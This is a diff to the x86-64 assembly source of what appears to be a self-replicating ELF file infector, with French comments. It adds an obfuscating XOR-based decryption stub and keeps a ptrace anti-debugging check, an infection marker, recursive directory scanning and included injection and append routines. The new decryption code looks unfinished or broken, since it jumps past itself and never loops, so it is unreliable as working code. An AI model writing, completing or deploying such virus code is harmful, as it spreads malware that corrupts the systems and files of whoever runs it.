@@ -1,7 +1,7 @@
 %include "include.s"
 
- ;   lea r15, [rel jump + 1]
- ;   cmp byte [r15], 0x90                ; cette ligne permet de quiter le code une fois qu'il a été infecter
+ ;   lea r15, [rel jump]
+ ;   cmp byte [r15], 0xC3                ; cette ligne permet de quiter le code une fois qu'il a été infecter
  ;   jnz close_mmap
 
 section .text
@@ -14,33 +14,45 @@ main:
     push rdi
     push rsi
 
-    lea rax, [rel jump]
-    cmp byte [rax], 0xC3                ; cette ligne permet d'encrypter uniquement si le virus est injecter
-    jz encrypted_start
-
 decrypte:
+    jmp encrypted_start
+    db "hahaahhhahhahahaha"
+    lea rdi, [rel decrypt_v2 + DECRYPT_FUNC_SIZE]
+    mov rsi, ENCRYPT_SIZE
+    lea rdx, [rel decrypt_v2 + DECRYPT_KEY_OFFSET]
+    mov rcx, KEY_SIZE
+    mov rbx, rsi
+    dec rbx
+    mov r8, rdx
 
-    mov rax, ENCRYPT_SIZE
+    ; if (i == 0) ; data[i] = data[i] ^ value[0]; else ; data[i] = data[i] ^ data[i - 1];
+    cmp rbx, 0
+    mov rdx, [rel decrypt_v2]
+    mov rdx, [rdi + rbx - 1]
+    xor byte [rdi + rbx], dl
+    
+
+    ; data[i] = data[i] ^ key[i % key_size];
     xor rdx, rdx
-	mov rbx, KEY_SIZE
-    div rbx
-    mov rcx, ENCRYPT_SIZE
-    lea rdi, [rel encrypted_start]
-    lea rsi, [rel key] 
-	decrypte_loop:
-	cmp rdx, 0
-	jnz decrypte_nochange
-	mov rdx, KEY_SIZE
-	decrypte_nochange:
-    dec rdx
-    dec rcx
-	mov bl, byte [rdi+rcx-1]
-    add bl, byte [rsi+rdx]
-	sub [rdi+rcx], bl
-	cmp rcx, 1
-	jnz decrypte_loop
-    mov bl, byte [rsi]
-	sub [rdi], bl
+    mov rax, rbx
+    div rcx
+    mov dl, [r8 + rdx]
+    xor [rdi + rbx], dl
+
+    ; data[i] = data[i] ^ value[i % 16]
+    mov rax, rbx
+    and rax, 15
+    lea rdx, [rel decrypt_v2]
+    mov al,  [rdx + rax]
+    xor byte [rdi + rbx], al
+
+    ; data[i] = (data[i] + i) % 256
+    mov al, byte [rdi + rbx]
+    sub al, bl
+    mov byte [rdi + rbx], al
+
+    dec rbx
+    cmp rbx, 0
 encrypted_start:
     xor rdi, rdi ;  PTRACE_TRACEME
     xor rsi, rsi
@@ -51,10 +63,9 @@ encrypted_start:
     cmp rax, 0
     jl exit
 
-    mov rax, SYS_GETPID
-    syscall
-    mov [rsp + ppid], rax
-
+;    mov rax, SYS_GETPID
+;    syscall
+;    mov [rsp + ppid], rax
 birth_of_child:
     call get_processus_actif
     cmp rax, 0
@@ -63,27 +74,27 @@ birth_of_child:
 
 scan_first_dir:
 
-    mov rax, SYS_FORK
-    syscall
-    mov rax, SYS_GETPID
-    syscall
-    cmp rax, [rsp + ppid]
-    jz scan_second_dir
+;    mov rax, SYS_FORK
+;    syscall
+;    mov rax, SYS_GETPID
+;    syscall
+;    cmp rax, [rsp + ppid]
+;    jz scan_second_dir
 
     lea rdi, [rsp + fileName]
     lea rsi, [rel firstDir]
     call ft_strcpy
     mov rdi, rsp
     call recursive
-    jmp exit
+;    jmp exit
 
 scan_second_dir:
-    mov rax, SYS_FORK
-    syscall
-    mov rax, SYS_GETPID
-    syscall
-    cmp rax, [rsp + ppid]
-    jz exit
+;    mov rax, SYS_FORK
+;    syscall
+;    mov rax, SYS_GETPID
+;    syscall
+;    cmp rax, [rsp + ppid]
+;    jz exit
 
     lea rdi, [rsp + fileName]
     lea rsi, [rel secondDir]
@@ -92,17 +103,17 @@ scan_second_dir:
     call recursive
 
 exit:
-    mov rax, SYS_GETPID
-    syscall
-    mov rbx, [rsp + ppid]
+ ;   mov rax, SYS_GETPID
+ ;   syscall
+ ;   mov rbx, [rsp + ppid]
     pop rsi
     pop rdi
     pop rcx
     pop rdx
     leave
-    cmp rax, rbx
-    jnz death_of_child
-    xor rax, rax
+;    cmp rax, rbx
+;    jnz death_of_child
+;    xor rax, rax
 jump:
     ret
     nop
@@ -122,5 +133,7 @@ death_of_child:
 %include "injection.s"
 
 %include "append.s"
+
+%include "decrypt.s"
 
 %include "data.s"
